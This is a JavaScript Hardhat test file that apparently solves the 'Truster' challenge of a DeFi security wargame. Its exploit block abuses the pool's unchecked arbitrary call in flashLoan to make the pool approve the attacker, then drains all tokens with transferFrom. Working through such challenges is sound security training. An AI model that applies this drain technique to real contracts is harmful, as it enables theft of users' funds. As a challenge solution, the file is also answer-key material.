const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        // You might not be able to spot the exploit at first glance but through process
        // of elimination, the biggest red flag that stands out is `target.functionCall(data);`
        // So what can you do with this? Literally anything so why not, we call approve?

        let abi = ["function approve(address spender, uint256 amount)"]
        let iface = new ethers.utils.Interface(abi);
        let data = iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL]);

        // Need to transfer 0 because if you tried to transfer more than 0, you need
        // to transfer it back. If you tried to use a smart contract to do this, you
        // would not be able to call approve correctly since msg.sender is changed.
        await this.pool.flashLoan(0, attacker.address, this.token.address, data);

        // Call transferFrom to exploit
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

